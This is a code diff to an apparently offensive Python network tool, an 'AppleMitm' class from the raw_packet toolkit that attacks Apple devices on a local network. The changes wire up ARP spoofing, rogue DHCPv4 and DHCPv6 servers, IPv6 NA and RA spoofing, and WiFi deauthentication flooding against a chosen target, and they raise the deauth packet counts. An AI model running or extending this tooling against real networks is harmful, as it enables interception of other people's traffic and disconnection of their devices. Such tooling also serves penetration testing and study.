@@ -16,10 +16,7 @@ from raw_packet.Utils.utils import Utils
 from raw_packet.Utils.tm import ThreadManager
 from raw_packet.Utils.wifi import WiFi
 from raw_packet.Utils.network import RawSniff
-
-from raw_packet.Scanners.nmap_scanner import Scanner
-from raw_packet.Scanners.arp_scanner import ArpScan
-from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
+from raw_packet.Scanners.icmpv6_router_search import ICMPv6RouterSearch
 
 from raw_packet.Servers.dns_server import DnsServer
 from raw_packet.Servers.dhcpv4_server import DHCPv4Server
@@ -35,7 +32,6 @@ from prettytable import PrettyTable
 from argparse import ArgumentParser, RawTextHelpFormatter
 from subprocess import run
 from time import sleep
-from ipaddress import IPv4Address
 from random import randint, choice
 from typing import Union, List, Dict
 # endregion
@@ -60,24 +56,18 @@ class AppleMitm:
     _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
     _utils: Utils = Utils()
     _wifi: Union[None, WiFi] = None
-    _icmpv6_scan: Union[None, ICMPv6Scan] = None
-    _scanner: Union[None, Scanner] = None
 
-    _mitm_techniques: Dict[int, str] = {
-        1: 'ARP Spoofing',
-        2: 'Second DHCP ACK',
-        3: 'Predict next DHCP transaction ID',
-        4: 'Rogue SLAAC/DHCPv6 server',
-        5: 'NA Spoofing (IPv6)',
-        6: 'RA Spoofing (IPv6)'
-    }
+    _mitm_techniques: List[str] = ['ARP Spoofing',
+                                   'Second DHCP ACK',
+                                   'Predict next DHCP transaction ID',
+                                   'Rogue SLAAC/DHCPv6 server',
+                                   'NA Spoofing (IPv6)',
+                                   'RA Spoofing (IPv6)']
     _mitm_technique: int = 1
 
-    _disconnect_techniques: Dict[int, str] = {
-        1: 'IPv4 network conflict detection',
-        2: 'Send WiFi deauthentication packets',
-        3: 'Do not disconnect device after MiTM'
-    }
+    _disconnect_techniques: List[str] = ['IPv4 network conflict detection',
+                                         'Send WiFi deauthentication packets',
+                                         'Do not disconnect device after MiTM']
     _disconnect_technique: int = 1
 
     _your: Dict[str, Union[None, str]] = {'network-interface': None,
@@ -100,7 +90,7 @@ class AppleMitm:
 
     _mtu: int = 1500
 
-    _deauth_packets: int = 5
+    _deauth_packets: int = 25
     _deauth_stop: bool = False
     # endregion
 
@@ -122,7 +112,7 @@ class AppleMitm:
                 self._wifi.send_deauth(bssid=self._your['bssid'],
                                        client=self._target['mac-address'],
                                        number_of_deauth_packets=number_of_deauth_packets)
-                number_of_deauth_packets += 10
+                number_of_deauth_packets += 25
                 sleep(30)
     # endregion
 
@@ -133,7 +123,7 @@ class AppleMitm:
         arp_spoof.start(gateway_ipv4_address=self._gateway['ipv4-address'],
                         target_ipv4_address=self._target['ipv4-address'],
                         target_mac_address=self._target['mac-address'],
-                        quit=True)
+                        quiet=False)
     # endregion
 
     # region NA spoofing
@@ -145,7 +135,7 @@ class AppleMitm:
                          target_mac_address=self._target['mac-address'],
                          gateway_ipv6_address=self._gateway['ipv6-address'],
                          dns_ipv6_address=self._dns_server['ipv6-address'],
-                         quit=True)
+                         quiet=False)
     # endregion
 
     # region RA spoofing
@@ -156,7 +146,7 @@ class AppleMitm:
                          target_ipv6_address=self._target['ipv6-address'],
                          target_mac_address=self._target['mac-address'],
                          gateway_ipv6_address=self._gateway['ipv6-address'],
-                         quit=True)
+                         quiet=False)
     # endregion
 
     # region DHCPv4 server
@@ -167,7 +157,7 @@ class AppleMitm:
                             target_ipv4_address=self._target['ipv4-address'],
                             dns_server_ipv4_address=self._dns_server['ipv4-address'],
                             router_ipv4_address=self._gateway['ipv4-address'],
-                            apple=True, quiet=True, exit_on_success=True)
+                            apple=True, quiet=False, exit_on_success=True)
     # endregion
 
     # region DHCPv4 server for Apple devices
@@ -176,7 +166,7 @@ class AppleMitm:
         apple_dhcp_server: AppleDHCPServer = AppleDHCPServer(network_interface=self._your['network-interface'])
         apple_dhcp_server.start(target_ip_address=self._target['new-ipv4-address'],
                                 target_mac_address=self._target['mac-address'],
-                                quit=True)
+                                quiet=False)
     # endregion
 
     # region DHCPv6 server
@@ -187,7 +177,7 @@ class AppleMitm:
                             target_mac_address=self._target['mac-address'],
                             dns_server_ipv6_address=self._dns_server['ipv6-address'],
                             ipv6_prefix=self._ipv6_network_prefix,
-                            exit_on_success=True, quit=False)
+                            exit_on_success=True, quiet=False)
     # endregion
 
     # region DNS server
